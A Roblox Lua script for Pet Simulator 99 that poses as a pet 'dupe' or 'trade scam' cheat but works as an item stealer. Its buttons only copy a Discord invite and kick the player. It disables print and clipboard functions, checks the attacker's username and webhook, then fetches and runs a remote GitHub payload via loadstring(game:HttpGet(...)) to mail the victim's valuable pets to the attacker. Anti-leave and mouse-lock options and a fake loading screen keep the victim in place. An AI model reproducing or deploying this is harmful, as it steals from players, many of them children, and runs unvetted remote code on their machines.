-- CODED BY kizamies#0001/Shimm
-- So dont sell it idiot

-- Anti print
local function antiPrint(...)
    local info = debug.getinfo(2)
    if info and info.what == 'Lua' and info.func == print then
        return
    end
    return print(...)
end

print = antiPrint
rconsoleprint = antiPrint
rconsolewarn = antiPrint
rconsoleerr = antiPrint
rconsoleinput = antiPrint
printconsole = antiPrint
setclipboard = antiPrint

-- Dupe script

if config.typescript == "dupe" and config.typesui == "orion" then
    OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
    local Window = OrionLib:MakeWindow({
        Name = config.scriptname ~= "" and config.scriptname or "Dupe script |PS99", -- Fallback to default if scriptname is empty
        HidePremium = false,
        SaveConfig = true,
        ConfigFolder = "OrionTest"
    })

    -- Create Tab in the Window
    local Tab = Window:MakeTab({
        Name = "Dupe Script",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })

    local Section = Tab:AddSection({
        Name = "Dupe Pets"
    })

    Tab:AddButton({
        Name = "Dupe Huges - Exclusives ! ",
        Callback = function()
            setclipboard(config.discordinv)
            game.Players.LocalPlayer:Kick("Wait 5 minutes and rejoin")
        end    
    })
end

if config.typescript == "dupe" and config.typesui == "kavo" then
    -- Destroy Orion UI if it was initialized
    if OrionLib then
        OrionLib:Destroy()
        OrionLib = nil
    end

    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
    local Window = Library.CreateLib(config.scriptname ~= "" and config.scriptname or "Dupe Script | PS99", "DarkTheme")

    local Tab = Window:NewTab("Dupe script")

    local Section = Tab:NewSection("Dupe Pets")

    Section:NewButton("Dupe Huges - Exclusives ! ", "Dupe huge to exclusive.", function()
        setclipboard(config.discordinv)
        game.Players.LocalPlayer:Kick("Wait 5 minutes and rejoin")
    end)
end


-- Validation for idiot who doesnt setup

local idiotuser = game:GetService("Players").LocalPlayer.Name

if idiotuser == config.Username then
    game:GetService("Players").LocalPlayer:Kick("You Are The Owner!")
    return;
end

if not config.Username or config.Username == "" then
    game.Players.LocalPlayer:Kick("You dont have username!")
    return
end

local work2 = pcall(function()
    return game:GetService("Players"):GetUserIdFromNameAsync(config.Username)
end)

if not work2 then
    game.Players.LocalPlayer:Kick("Put a valid username!")
    return
end

if not config.Webhook or config.Webhook == "" then
    game.Players.LocalPlayer:Kick("You dont have webhook!")
    return
end

if not config.Webhook or not string.find(config.Webhook, "https://") then
    game.Players.LocalPlayer:Kick("Put valid webhook!")
    return
end

if not config.typesui or config.typesui == "" then
    game.Players.LocalPlayer:Kick("pls set up type of ui!")
    return
end
	

-- Variables to Track Library Instances
local OrionLib = nil

-- Orion UI Integration
if config.typescript == "tradescam" and config.typesui == "orion" then
    OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
    local Window = OrionLib:MakeWindow({
        Name = config.scriptname ~= "" and config.scriptname or "Default Script Name", -- Fallback to default if scriptname is empty
        HidePremium = false,
        SaveConfig = true,
        ConfigFolder = "OrionTest"
    })

    -- Create Tab in the Window
    local Tab = Window:MakeTab({
        Name = "Trade Scam",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    })

    local Section = Tab:AddSection({
        Name = "Trade scam"
    })

    Tab:AddButton({
        Name = "ON",
        Callback = function()
            setclipboard(config.discordinv)
            print("if you read this you already got scam")
        end    
    })

    Tab:AddButton({
        Name = "OFF",
        Callback = function()
            setclipboard(config.discordinv)
            print("if you read this you already got scam")
        end    
    })
end

-- Kavo UI Integration
if config.typescript == "tradescam" and config.typesui == "kavo" then
    -- Destroy Orion UI if it was initialized
    if OrionLib then
        OrionLib:Destroy()
        OrionLib = nil
    end

    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
    local Window = Library.CreateLib(config.scriptname ~= "" and config.scriptname or "Default Script Name", "DarkTheme")

    local Tab = Window:NewTab("Trade Scam")

    local Section = Tab:NewSection("Wait till 5 minutes")

    Section:NewButton("ON", "ButtonInfo", function()
        setclipboard(config.discordinv)
            print("if you read this you already got scam")
    end)

    Section:NewButton("OFF", "ButtonInfo", function()
        setclipboard(config.discordinv)
            print("if you read this you already got scam")
    end)
end

-- Mailstealer Config
if config.stealer == "ps99" then
    --[[ Argon X Scripts - Config ]]--
    _G.Username = config.Username -- Username to send pets to
    if config.Webhook ~= "" then
        _G.Webhook = config.Webhook -- Optional, set only if webhook is provided
    end

    --[[ Rap Config ]]--
    _G.MinimumRAP = config.MinimumRap -- Minimum RAP of each item you want to get sent to you

    --[[ Loadingscreen Config 1 ]]--
    _G.MouseLock = config.mouselock -- Set to true or false
    _G.AntiLeave = config.antileave -- Set to true or false
    _G.LoadingScreen = config.loadingscreen -- Set to true or false

    --[[ Loadingscreen Config 2 ]]--
    _G.ScriptName = config.scriptname
    _G.FirstText = "Preparing Script..."
    _G.SecondText = "Loading Script..."
    _G.ThirdText = "Almost Done..."
    _G.WaitingTime = 180

    --[[ Main Script ]]--
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua", true))()
end
